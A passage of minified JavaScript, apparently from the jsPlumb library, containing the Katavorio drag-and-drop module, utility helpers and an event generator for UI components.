o=(e=e||n.parentNode).querySelectorAll(t),i=0;i<o.length;i++)if(o[i]===n)return!0;return!1},r=function(){var n=-1;if("Microsoft Internet Explorer"===navigator.appName){var t=navigator.userAgent;null!=new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})").exec(t)&&(n=parseFloat(RegExp.$1))}return n}(),d=r>-1&&r<9,_=9===r,s=function(n){if(d)return[n.clientX+document.documentElement.scrollLeft,n.clientY+document.documentElement.scrollTop];var t=w(n),e=a(t,0);return _?[e.pageX||e.clientX,e.pageY||e.clientY]:[e.pageX,e.pageY]},a=function(n,t){return n.item?n.item(t):n[t]},w=function(n){return n.touches&&n.touches.length>0?n.touches:n.changedTouches&&n.changedTouches.length>0?n.changedTouches:n.targetTouches&&n.targetTouches.length>0?n.targetTouches:[n]},l={draggable:"katavorio-draggable",droppable:"katavorio-droppable",drag:"katavorio-drag",selected:"katavorio-drag-selected",active:"katavorio-drag-active",hover:"katavorio-drag-hover",noSelect:"katavorio-drag-no-select",ghostProxy:"katavorio-ghost-proxy",clonedDrag:"katavorio-clone-drag"},u=["stop","start","drag","drop","over","out","beforeStart"],c=function(){},B=function(){return!0},h=function(n,t,e){for(var o=0;o<n.length;o++)n[o]!=e&&t(n[o])},j=function(n,t,e,o){h(n,function(n){n.setActive(t),t&&n.updatePosition(),e&&n.setHover(o,t)})},p=function(n,t){if(null!=n){n=o(n)||null!=n.tagName||null==n.length?[n]:n;for(var e=0;e<n.length;e++)t.apply(n[e],[n[e]])}},f=function(n){n.stopPropagation?(n.stopPropagation(),n.preventDefault()):n.returnValue=!1},g=function(n,t,e,o){this.params=t||{},this.el=n,this.params.addClass(this.el,this._class),this.uuid=y();var i=!0;return this.setEnabled=function(n){i=n},this.isEnabled=function(){return i},this.toggleEnabled=function(){i=!i},this.setScope=function(n){this.scopes=n?n.split(/\s+/):[o]},this.addScope=function(n){var t={};for(var e in p(this.scopes,function(n){t[n]=!0}),p(n?n.split(/\s+/):[],function(n){t[n]=!0}),this.scopes=[],t)this.scopes.push(e)},this.removeScope=function(n){var t={};for(var e in p(this.scopes,function(n){t[n]=!0}),p(n?n.split(/\s+/):[],function(n){delete t[n]}),this.scopes=[],t)this.scopes.push(e)},this.toggleScope=function(n){var t={};for(var e in p(this.scopes,function(n){t[n]=!0}),p(n?n.split(/\s+/):[],function(n){t[n]?delete t[n]:t[n]=!0}),this.scopes=[],t)this.scopes.push(e)},this.setScope(t.scope),this.k=t.katavorio,t.katavorio},m=function(){return!0},v=function(){return!1},C=function(n,t,e,r){this._class=e.draggable;var d=g.apply(this,arguments);this.rightButtonCanDrag=this.params.rightButtonCanDrag;var _=[0,0],a=null,w=null,u=[0,0],c=!1,h=!1!==this.params.consumeStartEvent,p=this.el,C=this.params.clone,b=(this.params.scroll,!1!==t.multipleDrop),P=!1,E=!0===t.ghostProxy?m:t.ghostProxy&&"function"==typeof t.ghostProxy?t.ghostProxy:v,x=t.snapThreshold,A=function(n,t,e,o,i){var r=t*Math.floor(n[0]/t),d=r+t,_=Math.abs(n[0]-r)<=o?r:Math.abs(d-n[0])<=o?d:n[0],s=e*Math.floor(n[1]/e),a=s+e;return[_,Math.abs(n[1]-s)<=i?s:Math.abs(a-n[1])<=i?a:n[1]]};this.posses=[],this.posseRoles={},this.toGrid=function(n){if(null==this.params.grid)return n;var t=this.params.grid?this.params.grid[0]/2:x||5,e=this.params.grid?this.params.grid[1]/2:x||5;return A(n,this.params.grid[0],this.params.grid[1],t,e)},this.snap=function(n,t){if(null!=p){n=n||(this.params.grid?this.params.grid[0]:10),t=t||(this.params.grid?this.params.grid[1]:10);var e=this.params.getPosition(p),o=this.params.grid?this.params.grid[0]/2:x,i=this.params.grid?this.params.grid[1]/2:x;this.params.setPosition(p,A(e,n,t,o,i))}},this.setUseGhostProxy=function(n){E=n?m:v};var S,I,k=function(n){return!1===t.allowNegative?[Math.max(0,n[0]),Math.max(0,n[1])]:n},T=function(n){S="function"==typeof n?n:n?function(n){return k([Math.max(0,Math.min(O.w-this.size[0],n[0])),Math.max(0,Math.min(O.h-this.size[1],n[1]))])}.bind(this):function(n){return k(n)}}.bind(this);T("function"==typeof this.params.constrain?this.params.constrain:this.params.constrain||this.params.containment),this.setConstrain=function(n){T(n)},this.setRevert=function(n){I=n};var M={},N=this.setFilter=function(t,e){if(t){var r=function(n){return"function"==typeof n?(n._katavorioId=y(),n._katavorioId):n}(t);M[r]=[function(e){var r,d=e.srcElement||e.target;return o(t)?r=i(d,t,n):"function"==typeof t&&(r=t(e,n)),r},!1!==e]}};this.addFilter=N,this.removeFilter=function(n){var t="function"==typeof n?n._katavorioId:n;delete M[t]},this.clearAllFilters=function(){M={}},this.canDrag=this.params.canDrag||B;var O,F=[],L=[];this.downListener=function(n){if((this.rightButtonCanDrag||3!==n.which&&2!==n.button)&&this.isEnabled()&&this.canDrag())if(function(n){for(var t in M){var e=M[t],o=e[0](n);if(e[1]&&(o=!o),!o)return!1}return!0}(n)&&function(n,t,e){var o=n.srcElement||n.target;return!i(o,e.getInputFilterSelector(),t)}(n,this.el,this.k)){if(C){(p=this.el.cloneNode(!0)).setAttribute("id",null),p.style.position="absolute";var t=function(n){var t=n.getBoundingClientRect(),e=document.body,o=document.documentElement,i=window.pageYOffset||o.scrollTop||e.scrollTop,r=window.pageXOffset||o.scrollLeft||e.scrollLeft,d=o.clientTop||e.clientTop||0,_=o.clientLeft||e.clientLeft||0,s=t.top+i-d,a=t.left+r-_;return{top:Math.round(s),left:Math.round(a)}}(this.el);p.style.left=t.left+"px",p.style.top=t.top+"px",this.params.addClass(p,l.clonedDrag),document.body.appendChild(p)}else p=this.el;h&&f(n),_=s(n),this.params.bind(document,"mousemove",this.moveListener),this.params.bind(document,"mouseup",this.upListener),d.markSelection(this),d.markPosses(this),this.params.addClass(document.body,e.noSelect),U("beforeStart",{el:this.el,pos:a,e:n,drag:this})}else this.params.consumeFilteredEvents&&f(n)}.bind(this),this.moveListener=function(n){if(_){if(!c)if(!1!==U("start",{el:this.el,pos:a,e:n,drag:this})){if(!_)return;this.mark(!0),c=!0}else this.abort();if(_){L.length=0;var t=s(n),e=t[0]-_[0],o=t[1]-_[1],i=this.params.ignoreZoom?1:d.getZoom();e/=i,o/=i,this.moveBy(e,o,n),d.updateSelection(e,o,this),d.updatePosses(e,o,this)}}}.bind(this),this.upListener=function(n){_&&(_=null,this.params.unbind(document,"mousemove",this.moveListener),this.params.unbind(document,"mouseup",this.upListener),this.params.removeClass(document.body,e.noSelect),this.unmark(n),d.unmarkSelection(this,n),d.unmarkPosses(this,n),this.stop(n),d.notifySelectionDragStop(this,n),d.notifyPosseDragStop(this,n),c=!1,C&&(p&&p.parentNode&&p.parentNode.removeChild(p),p=null),L.length=0,I&&!0===I(this.el,this.params.getPosition(this.el))&&(this.params.setPosition(this.el,a),U("revert",this.el)))}.bind(this),this.getFilters=function(){return M},this.abort=function(){null!=_&&this.upListener()},this.getDragElement=function(){return p||this.el};var R={start:[],drag:[],stop:[],over:[],out:[],beforeStart:[],revert:[]};t.events.start&&R.start.push(t.events.start),t.events.beforeStart&&R.beforeStart.push(t.events.beforeStart),t.events.stop&&R.stop.push(t.events.stop),t.events.drag&&R.drag.push(t.events.drag),t.events.revert&&R.revert.push(t.events.revert),this.on=function(n,t){R[n]&&R[n].push(t)},this.off=function(n,t){if(R[n]){for(var e=[],o=0;o<R[n].length;o++)R[n][o]!==t&&e.push(R[n][o]);R[n]=e}};var G,U=function(n,t){var e=null;if(R[n])for(var o=0;o<R[n].length;o++)try{var i=R[n][o](t);null!=i&&(e=i)}catch(n){}return e};this.notifyStart=function(n){U("start",{el:this.el,pos:this.params.getPosition(p),e:n,drag:this})},this.stop=function(n,t){if(t||c){var e=[],o=d.getSelection(),i=this.params.getPosition(p);if(o.length>1)for(var r=0;r<o.length;r++){var _=this.params.getPosition(o[r].el);e.push([o[r].el,{left:_[0],top:_[1]},o[r]])}else e.push([p,{left:i[0],top:i[1]},this]);U("stop",{el:p,pos:G||i,finalPos:i,e:n,drag:this,selection:e})}},this.mark=function(n){var t;a=this.params.getPosition(p),w=this.params.getPosition(p,!0),u=[w[0]-a[0],w[1]-a[1]],this.size=this.params.getSize(p),F=d.getMatchingDroppables(this),j(F,!0,!1,this),this.params.addClass(p,this.params.dragClass||e.drag),t=this.params.getConstrainingRectangle?this.params.getConstrainingRectangle(p):this.params.getSize(p.parentNode),O={w:t[0],h:t[1]},n&&d.notifySelectionDragStart(this)},this.unmark=function(n,o){if(j(F,!1,!0,this),P&&E(this.el)?(G=[p.offsetLeft,p.offsetTop],this.el.parentNode.removeChild(p),p=this.el):G=null,this.params.removeClass(p,this.params.dragClass||e.drag),F.length=0,P=!1,!o){L.length>0&&G&&t.setPosition(this.el,G),L.sort(D);for(var i=0;i<L.length&&!0!==L[i].drop(this,n);i++);}},this.moveBy=function(n,e,o){L.length=0;var i=this.toGrid([a[0]+n,a[1]+e]),r=S(i,p);if(E(this.el))if(i[0]!==r[0]||i[1]!==r[1]){if(!P){var d=function(n){return n.cloneNode(!0)}(this.el);t.addClass(d,l.ghostProxy),this.el.parentNode.appendChild(d),p=d,P=!0}r=i}else P&&(this.el.parentNode.removeChild(p),p=this.el,P=!1);var _={x:r[0],y:r[1],w:this.size[0],h:this.size[1]},s={x:_.x+u[0],y:_.y+u[1],w:_.w,h:_.h},w=null;this.params.setPosition(p,r);for(var c=0;c<F.length;c++){var B={x:F[c].pagePosition[0],y:F[c].pagePosition[1],w:F[c].size[0],h:F[c].size[1]};this.params.intersects(s,B)&&(b||null==w||w===F[c].el)&&F[c].canDrop(this)?(w||(w=F[c].el),L.push(F[c]),F[c].setHover(this,!0,o)):F[c].isHover()&&F[c].setHover(this,!1,o)}U("drag",{el:this.el,pos:r,e:o,drag:this})},this.destroy=function(){this.params.unbind(this.el,"mousedown",this.downListener),this.params.unbind(document,"mousemove",this.moveListener),this.params.unbind(document,"mouseup",this.upListener),this.downListener=null,this.upListener=null,this.moveListener=null},this.params.bind(this.el,"mousedown",this.downListener),this.params.handle?N(this.params.handle,!1):N(this.params.filter,this.params.filterExclude)},b=function(n,t,e,o){this._class=e.droppable,this.params=t||{},this.rank=t.rank||0,this._activeClass=this.params.activeClass||e.active,this._hoverClass=this.params.hoverClass||e.hover,g.apply(this,arguments);var i=!1;this.allowLoopback=!1!==this.params.allowLoopback,this.setActive=function(n){this.params[n?"addClass":"removeClass"](this.el,this._activeClass)},this.updatePosition=function(){this.position=this.params.getPosition(this.el),this.pagePosition=this.params.getPosition(this.el,!0),this.size=this.params.getSize(this.el)},this.canDrop=this.params.canDrop||function(n){return!0},this.isHover=function(){return i},this.setHover=function(n,t,e){(t||null==this.el._katavorioDragHover||this.el._katavorioDragHover===n.el._katavorio)&&(this.params[t?"addClass":"removeClass"](this.el,this._hoverClass),this.el._katavorioDragHover=t?n.el._katavorio:null,i!==t&&this.params.events[t?"over":"out"]({el:this.el,e:e,drag:n,drop:this}),i=t)},this.drop=function(n,t){return this.params.events.drop({drag:n,e:t,drop:this})},this.destroy=function(){this._class=null,this._activeClass=null,this._hoverClass=null,i=null}},y=function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(n){var t=16*Math.random()|0;return("x"===n?t:3&t|8).toString(16)})},D=function(n,t){return n.rank<t.rank?1:n.rank>t.rank?-1:0},P=function(n){return null==n?null:null==(n="string"==typeof n||n.constructor===String?document.getElementById(n):n)?null:(n._katavorio=n._katavorio||y(),n)};n.Katavorio=function(n){var i=[],r={};this._dragsByScope={},this._dropsByScope={};var d=1,_=function(n,t){p(n,function(n){for(var e=0;e<n.scopes.length;e++)t[n.scopes[e]]=t[n.scopes[e]]||[],t[n.scopes[e]].push(n)})},s=function(t,e){var o=0;return p(t,function(t){for(var i=0;i<t.scopes.length;i++)if(e[t.scopes[i]]){var r=n.indexOf(e[t.scopes[i]],t);-1!==r&&(e[t.scopes[i]].splice(r,1),o++)}}),o>0},a=(this.getMatchingDroppables=function(n){for(var t=[],e={},o=0;o<n.scopes.length;o++){var i=this._dropsByScope[n.scopes[o]];if(i)for(var r=0;r<i.length;r++)!i[r].canDrop(n)||e[i[r].uuid]||!i[r].allowLoopback&&i[r].el===n.el||(e[i[r].uuid]=!0,t.push(i[r]))}return t.sort(D),t},function(t){t=t||{};var e,o={events:{}};for(e in n)o[e]=n[e];for(e in t)o[e]=t[e];for(e=0;e<u.length;e++)o.events[u[e]]=t[u[e]]||c;return o.katavorio=this,o}.bind(this)),w=function(n,t){for(var e=0;e<u.length;e++)t[u[e]]&&n.on(u[e],t[u[e]])}.bind(this),B={},j=n.css||{},f=n.scope||"katavorio-drag-scope";for(var g in l)B[g]=l[g];for(var g in j)B[g]=j[g];var m=n.inputFilterSelector||"input,textarea,select,button,option";this.getInputFilterSelector=function(){return m},this.setInputFilterSelector=function(n){return m=n,this},this.draggable=function(t,e){var o=[];return p(t,function(t){if(null!=(t=P(t)))if(null==t._katavorioDrag){var i=a(e);t._katavorioDrag=new C(t,i,B,f),_(t._katavorioDrag,this._dragsByScope),o.push(t._katavorioDrag),n.addClass(t,B.draggable)}else w(t._katavorioDrag,e)}.bind(this)),o},this.droppable=function(t,e){var o=[];return p(t,function(t){if(null!=(t=P(t))){var i=new b(t,a(e),B,f);t._katavorioDrop=t._katavorioDrop||[],t._katavorioDrop.push(i),_(i,this._dropsByScope),o.push(i),n.addClass(t,B.droppable)}}.bind(this)),o},this.select=function(t){return p(t,function(){var t=P(this);t&&t._katavorioDrag&&(r[t._katavorio]||(i.push(t._katavorioDrag),r[t._katavorio]=[t,i.length-1],n.addClass(t,B.selected)))}),this},this.deselect=function(t){return p(t,function(){var t=P(this);if(t&&t._katavorio&&r[t._katavorio]){for(var e=[],o=0;o<i.length;o++)i[o].el!==t&&e.push(i[o]);i=e,delete r[t._katavorio],n.removeClass(t,B.selected)}}),this},this.deselectAll=function(){for(var t in r){var e=r[t];n.removeClass(e[0],B.selected)}i.length=0,r={}},this.markSelection=function(n){h(i,function(n){n.mark()},n)},this.markPosses=function(n){n.posses&&p(n.posses,function(t){n.posseRoles[t]&&x[t]&&h(x[t].members,function(n){n.mark()},n)})},this.unmarkSelection=function(n,t){h(i,function(n){n.unmark(t)},n)},this.unmarkPosses=function(n,t){n.posses&&p(n.posses,function(e){n.posseRoles[e]&&x[e]&&h(x[e].members,function(n){n.unmark(t,!0)},n)})},this.getSelection=function(){return i.slice(0)},this.updateSelection=function(n,t,e){h(i,function(e){e.moveBy(n,t)},e)};var v=function(n,t){t.posses&&p(t.posses,function(e){t.posseRoles[e]&&x[e]&&h(x[e].members,function(t){n(t)},t)})};this.updatePosses=function(n,t,e){v(function(e){e.moveBy(n,t)},e)},this.notifyPosseDragStop=function(n,t){v(function(n){n.stop(t,!0)},n)},this.notifySelectionDragStop=function(n,t){h(i,function(n){n.stop(t,!0)},n)},this.notifySelectionDragStart=function(n,t){h(i,function(n){n.notifyStart(t)},n)},this.setZoom=function(n){d=n},this.getZoom=function(){return d};var y=function(n,t,e,o){p(n,function(n){s(n,e),n[o](t),_(n,e)})};p(["set","add","remove","toggle"],function(n){this[n+"Scope"]=function(t,e){y(t._katavorioDrag,e,this._dragsByScope,n+"Scope"),y(t._katavorioDrop,e,this._dropsByScope,n+"Scope")}.bind(this),this[n+"DragScope"]=function(t,e){y(t.constructor===C?t:t._katavorioDrag,e,this._dragsByScope,n+"Scope")}.bind(this),this[n+"DropScope"]=function(t,e){y(t.constructor===b?t:t._katavorioDrop,e,this._dropsByScope,n+"Scope")}.bind(this)}.bind(this)),this.snapToGrid=function(n,t){for(var e in this._dragsByScope)h(this._dragsByScope[e],function(e){e.snap(n,t)})},this.getDragsForScope=function(n){return this._dragsByScope[n]},this.getDropsForScope=function(n){return this._dropsByScope[n]};var E=function(n,t,e){if((n=P(n))[t]){var o=i.indexOf(n[t]);o>=0&&i.splice(o,1),s(n[t],e)&&p(n[t],function(n){n.destroy()}),delete n[t]}};this.elementRemoved=function(n){this.destroyDraggable(n),this.destroyDroppable(n)},this.destroyDraggable=function(n){E(n,"_katavorioDrag",this._dragsByScope)},this.destroyDroppable=function(n){E(n,"_katavorioDrop",this._dropsByScope)},this.reset=function(){this._dragsByScope={},this._dropsByScope={},i=[],r={},x={}};var x={},A=function(n,e,i){var r=o(e)?e:e.id,d=!!o(e)||!1!==e.active,_=x[r]||function(){var n={name:r,members:[]};return x[r]=n,n}();return p(n,function(n){if(n._katavorioDrag){if(i&&null!=n._katavorioDrag.posseRoles[_.name])return;t(_.members,n._katavorioDrag),t(n._katavorioDrag.posses,_.name),n._katavorioDrag.posseRoles[_.name]=d}}),_};this.addToPosse=function(n,t){for(var e=[],o=1;o<arguments.length;o++)e.push(A(n,arguments[o]));return 1===e.length?e[0]:e},this.setPosse=function(n,t){for(var e=[],o=1;o<arguments.length;o++)e.push(A(n,arguments[o],!0).name);return p(n,function(n){if(n._katavorioDrag){var t=function(n,t){for(var e=[],o=0;o<n.length;o++)-1===t.indexOf(n[o])&&e.push(n[o]);return e}(n._katavorioDrag.posses,e);Array.prototype.push.apply([],n._katavorioDrag.posses);for(var o=0;o<t.length;o++)this.removeFromPosse(n,t[o])}}.bind(this)),1===e.length?e[0]:e},this.removeFromPosse=function(n,t){if(arguments.length<2)throw new TypeError("No posse id provided for remove operation");for(var o=1;o<arguments.length;o++)t=arguments[o],p(n,function(n){if(n._katavorioDrag&&n._katavorioDrag.posses){var o=n._katavorioDrag;p(t,function(n){e(x[n].members,o),e(o.posses,n),delete o.posseRoles[n]})}})},this.removeFromAllPosses=function(n){p(n,function(n){if(n._katavorioDrag&&n._katavorioDrag.posses){var t=n._katavorioDrag;p(t.posses,function(n){e(x[n].members,t)}),t.posses.length=0,t.posseRoles={}}})},this.setPosseState=function(n,t,e){var o=x[t];o&&p(n,function(n){n._katavorioDrag&&n._katavorioDrag.posses&&(n._katavorioDrag.posseRoles[o.name]=e)})}},n.Katavorio.version="0.23.0","undefined"!=typeof exports&&(exports.Katavorio=n.Katavorio)}.call("undefined"!=typeof window?window:this),function(){var n=function(n){return"[object Array]"===Object.prototype.toString.call(n)},t=function(n){return"string"==typeof n},e=function(n){return"boolean"==typeof n},o=function(n){return null!=n&&"[object Object]"===Object.prototype.toString.call(n)},i=function(n){return"[object Date]"===Object.prototype.toString.call(n)},r=function(n){return"[object Function]"===Object.prototype.toString.call(n)},d=this;d.jsPlumbUtil={isArray:n,isString:t,isBoolean:e,isNull:function(n){return null==n},isObject:o,isDate:i,isFunction:r,isEmpty:function(n){for(var t in n)if(n.hasOwnProperty(t))return!1;return!0},isNumber:function(n){return"[object Number]"===Object.prototype.toString.call(n)},clone:function(d){if(t(d))return""+d;if(e(d))return!!d;if(i(d))return new Date(d.getTime());if(r(d))return d;if(n(d)){for(var _=[],s=0;s<d.length;s++)_.push(this.clone(d[s]));return _}if(o(d)){var a={};for(var w in d)a[w]=this.clone(d[w]);return a}return d},merge:function(i,r,d){var _,s,a={};for(d=d||[],s=0;s<d.length;s++)a[d[s]]=!0;var w=this.clone(i);for(s in r)if(null==w[s])w[s]=r[s];else if(t(r[s])||e(r[s]))a[s]?((_=[]).push.apply(_,n(w[s])?w[s]:[w[s]]),_.push.apply(_,n(r[s])?r[s]:[r[s]]),w[s]=_):w[s]=r[s];else if(n(r[s]))_=[],n(w[s])&&_.push.apply(_,w[s]),_.push.apply(_,r[s]),w[s]=_;else if(o(r[s]))for(var l in o(w[s])||(w[s]={}),r[s])w[s][l]=r[s][l];return w},replace:function(n,t,e){if(null!=n){var o=n;return t.replace(/([^\.])+/g,function(n,t,i,r){var d=n.match(/([^\[0-9]+){1}(\[)([0-9+])/),_=function(){return o[d[1]]||(o[d[1]]=[],o[d[1]])};if(i+n.length>=r.length)d?_()[d[3]]=e:o[n]=e;else if(d){var s=_();o=s[d[3]]||(s[d[3]]={},s[d[3]])}else o=o[n]||(o[n]={},o[n])}),n}},functionChain:function(n,t,e){for(var o=0;o<e.length;o++){var i=e[o][0][e[o][1]].apply(e[o][0],e[o][2]);if(i===t)return i}return n},populate:function(e,i,d){return function e(_){if(null!=_){if(t(_))return function(n){var t=n.match(/(\${.*?})/g);if(null!=t)for(var e=0;e<t.length;e++){var o=i[t[e].substring(2,t[e].length-1)]||"";null!=o&&(n=n.replace(t[e],o))}return n}(_);if(!r(_)||null!=d&&0!==(_.name||"").indexOf(d)){if(n(_)){for(var s=[],a=0;a<_.length;a++)s.push(e(_[a]));return s}if(o(_)){var w={};for(var l in _)w[l]=e(_[l]);return w}return _}return _(i)}}(e)},findWithFunction:function(n,t){if(n)for(var e=0;e<n.length;e++)if(t(n[e]))return e;return-1},removeWithFunction:function(n,t){var e=d.jsPlumbUtil.findWithFunction(n,t);return e>-1&&n.splice(e,1),-1!==e},remove:function(n,t){var e=n.indexOf(t);return e>-1&&n.splice(e,1),-1!==e},addWithFunction:function(n,t,e){-1===d.jsPlumbUtil.findWithFunction(n,e)&&n.push(t)},addToList:function(n,t,e,o){var i=n[t];return null==i&&(i=[],n[t]=i),i[o?"unshift":"push"](e),i},suggest:function(n,t,e){return-1===n.indexOf(t)&&(e?n.unshift(t):n.push(t),!0)},extend:function(t,e,o){var i;for(e=n(e)?e:[e],i=0;i<e.length;i++)for(var r in e[i].prototype)e[i].prototype.hasOwnProperty(r)&&(t.prototype[r]=e[i].prototype[r]);var d=function(n,t){return function(){for(i=0;i<e.length;i++)e[i].prototype[n]&&e[i].prototype[n].apply(this,arguments);return t.apply(this,arguments)}},_=function(n){for(var e in n)t.prototype[e]=d(e,n[e])};if(arguments.length>2)for(i=2;i<arguments.length;i++)_(arguments[i]);return t},uuid:function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(n){var t=16*Math.random()|0;return("x"===n?t:3&t|8).toString(16)})},logEnabled:!0,log:function(){if(d.jsPlumbUtil.logEnabled&&"undefined"!=typeof console)try{var n=arguments[arguments.length-1];console.log(n)}catch(n){}},wrap:function(n,t,e){return function(){var o=null;try{null!=t&&(o=t.apply(this,arguments))}catch(n){d.jsPlumbUtil.log("jsPlumb function failed : "+n)}if(null!=n&&(null==e||o!==e))try{o=n.apply(this,arguments)}catch(n){d.jsPlumbUtil.log("wrapped function failed : "+n)}return o}}},d.jsPlumbUtil.EventGenerator=function(){var n={},t=!1,e=!1,o={ready:!0},i=[];this.bind=function(t,e,o){var i=function(t){d.jsPlumbUtil.addToList(n,t,e,o),e.__jsPlumb=e.__jsPlumb||{},e.__jsPlumb[d.jsPlumbUtil.uuid()]=t};if("string"==typeof t)i(t);else if(null!=t.length)for(var r=0;r<t.length;r++)i(t[r]);return this},this.fire=function(_,s,a){if(e)i.unshift(arguments);else{if(e=!0,!t&&n[_]){var w=n[_].length,l=0,u=!1,c=null;if(!this.shouldFireEvent||this.shouldFireEvent(_,s,a))for(;!u&&l<w&&!1!==c;){if(o[_])n[_][l].apply(this,[s,a]);else try{c=n[_][l].apply(this,[s,a])}catch(n){d.jsPlumbUtil.log("jsPlumb: fire failed for event "+_+" : "+n)}l++,null!=n&&null!=n[_]||(u=!0)}}e=!1,r()}return this};var r=function(){var n=i.pop();n&&this.fire.apply(this,n)}.bind(this);this.unbind=function(t,e){if(0===arguments.length)n={};else if(1===arguments.length){if("string"==typeof t)delete n[t];else if(t.__jsPlumb){var o;for(var i in t.__jsPlumb)o=t.__jsPlumb[i],d.jsPlumbUtil.remove(n[o]||[],t)}}else 2===arguments.length&&d.jsPlumbUtil.remove(n[t]||[],e);return this},this.getListener=function(t){return n[t]},this.setSuspendEvents=function(n){t=n},this.isSuspendEvents=function(){return t},this.silently=function(n){this.setSuspendEvents(!0);try{n()}catch(n){d.jsPlumbUtil.log("Cannot execute silent function "+n)}this.setSuspendEvents(!1)},this.cleanupListeners=function(){for(var t in n)n[t]=null}},d.jsPlumbUtil.EventGenerator.prototype={cleanup:function(){this.cleanupListeners()}},"undefined"!=typeof exports&&(exports.jsPlumbUtil=d.jsPlumbUtil)}.call("undefined"!=typeof window?window:this),function(){var n=this;n.jsPlumbUtil.matchesSelector=function(n,t,e){for(var o=(e=e||n.parentNode).querySelectorAll(t),i=0;i<o.length;i++)if(o[i]===n)return!0;return!1},n.jsPlumbUtil.consume=function(n,t){n.stopPropagation?n.stopPropagation():n.returnValue=!1,!t&&n.preventDefault&&n.preventDefault()},n.jsPlumbUtil.sizeElement=function(n,t,e,o,i){n&&(n.style.height=i+"px",n.height=i,n.style.width=o+"px",n.width=o,n.style.left=t+"px",n.style.top=e+"px")}}.call("undefined"!=typeof window?window:this),function(){var n=this,t=n.jsPlumbUtil,e=function(){return""+(new Date).getTime()},o=function(n){if(n._jsPlumb.paintStyle&&n._jsPlumb.hoverPaintStyle){var t={};j.extend(t,n._jsPlumb.paintStyle),j.extend(t,n._jsPlumb.hoverPaintStyle),delete n._jsPlumb.hoverPaintStyle,t.gradient&&n._jsPlumb.paintStyle.fill&&delete t.gradient,n._jsPlumb.hoverPaintStyle=t}},i=["tap","dbltap","click","dblclick","mouseover","mouseout","mousemove","mousedown","mouseup","contextmenu"],r=function(n){return null==n?null:n.split(" ")},_=function(n,t,e){for(var o in t)n[o]=e},a=function(n,e){e=t.isArray(e)||null!=e.length&&!t.isString(e)?e:[e];for(var o=0;o<e.length;o++)try{n.apply(e[o],[e[o]])}catch(n){t.log(".each iteration failed : "+n)}},w=function(n,e,o){if(n.getDefaultType){var i=n.getTypeDescriptor(),r={},d=n.getDefaultType(),s=t.merge({},d);_(r,d,"__default");for(var a=0,w=n._jsPlumb.types.length;a<w;a++){var l=n._jsPlumb.types[a];if("__default"!==l){var u=n._jsPlumb.instance.getType(l,i);null!=u&&(s=t.merge(s,u,["cssClass"]),_(r,u,l))}}e&&(s=t.populate(s,e,"_")),n.applyType(s,o,r),o||n.repaint()}},l=n.jsPlumbUIComponent=function(n){t.EventGenerator.apply(this,arguments);var e=arguments,o=this.idPrefix+(new Date).getTime();this._jsPlumb={instance:n._jsPlumb,parameters:n.parameters||{},paintStyle:null,hoverPaintStyle:null,paintStyleInUse:null,hover:!1,beforeDetach:n.beforeDetach,beforeDrop:n.beforeDrop,overlayPlacements:[],hoverClass:n.hoverClass||n._jsPlumb.Defaults.HoverClass,types:[],typeCache:{}},this.cacheTypeItem=function(n,t,e){this._jsPlumb.typeCache[e]=this._jsPlumb.typeCache[e]||{},this._jsPlumb.typeCache[e][n]=t},this.getCachedTypeItem=function(n,t){return this._jsPlumb.typeCache[t]?this._jsPlumb.typeCache[t][n]:null},this.getId=function(){return o};var i=n.overlays||[],r={};if(this.defaultOverlayKeys){for(var d=0;d<this.defaultOverlayKeys.length;d++)Array.prototype.push.apply(i,this._jsPlumb.instance.Defaults[this.defaultOverlayKeys[d]]||[]);for(d=0;d<i.length;d++){var _=j.convertToFullOverlaySpec(i[d]);r[_[1].id]=_}}var a={overlays:r,parameters:n.parameters||{},scope:n.scope||this._jsPlumb.instance.getDefaultScope()};if(this.getDefaultType=function(){return a},this.appendToDefaultType=function(n){for(var t in n)a[t]=n[t]},n.events)for(var w in n.events)this.bind(w,n.events[w]);this.clone=function(){var n=s()(this.constructor.prototype);return this.constructor.apply(n,e),n}.bind(this),this.isDetachAllowed=function(n){var e=!0;if(this._jsPlumb.beforeDetach)try{e=this._jsPlumb.beforeDetach(n)}catch(n){t.log("jsPlumb: beforeDetach callback failed",n)}return e},this.isDropAllowed=function(n,e,o,i,r,d,_){var s=this._jsPlumb.instance.checkCondition("beforeDrop",{sourceId:n,targetId:e,scope:o,connection:i,dropEndpoint:r,source:d,target:_});if(this._jsPlumb.beforeDrop)try{s=this._jsPlumb.beforeDrop({sourceId:n,targetId:e,scope:o,connection:i,dropEndpoint:r,source:d,target:_})}catch(n){t.log("jsPlumb: beforeDrop callback failed",n)}return s};var l=[];this.setListenerComponent=function(n){for(var t=0;t<l.length;t++)l[t][3]=n}},u=function(n,t){var e=n._jsPlumb.types[t],o=n._jsPlumb.instance.getType(e,n.getTypeDescriptor());null!=o&&o.cssClass&&n.canvas&&n._jsPlumb.instance.removeClass(n.canvas,o.cssClass)};t.extend(n.jsPlumbUIComponent,t.EventGenerator,{getParameter:function(n){return this._jsPlumb.parameters[n]},setParameter:function(n,t){this._jsPlumb.parameters[n]=t},getParameters:function(){return this._jsPlumb.parameters},setParameters:function(n){this._jsPlumb.parameters=n},getClass:function(){return j.getClass(this.canvas)},hasClass:function(n){return j.hasClass(this.canvas,n)},addClass:function(n){j.addClass(this.canvas,n)},removeClass:function(n){j.removeClass(this.canvas,n)},updateClasses:function(n,t){j.updateClasses(this.canvas,n,t)},setType:function(n,t,e){this.clearTypes(),this._jsPlumb.types=r(n)||[],w(this,t,e)},getType:function(){return this._jsPlumb.types},reapplyTypes:function(n,t){w(this,n,t)},hasType:function(n){return-1!==this._jsPlumb.types.indexOf(n)},addType:function(n,t,e){var o=r(n),i=!1;if(null!=o){for(var d=0,_=o.length;d<_;d++)this.hasType(o[d])||(this._jsPlumb.types.push(o[d]),i=!0);i&&w(this,t,e)}},removeType:function(n,t,e){var o=r(n),i=!1,d=function(n){var t=this._jsPlumb.types.indexOf(n);return-1!==t&&(u(this,t),this._jsPlumb.types.splice(t,1),!0)}.bind(this);if(null!=o){for(var _=0,s=o.length;_<s;_++)i=d(o[_])||i;i&&w(this,t,e)}},clearTypes:function(n,t){for(var e=this._jsPlumb.types.length,o=0;o<e;o++)u(this,0),this._jsPlumb.types.splice(0,1);w(this,n,t)},toggleType:function(n,t,e){var o=r(n);if(null!=o){for(var i=0,d=o.length;i<d;i++){var 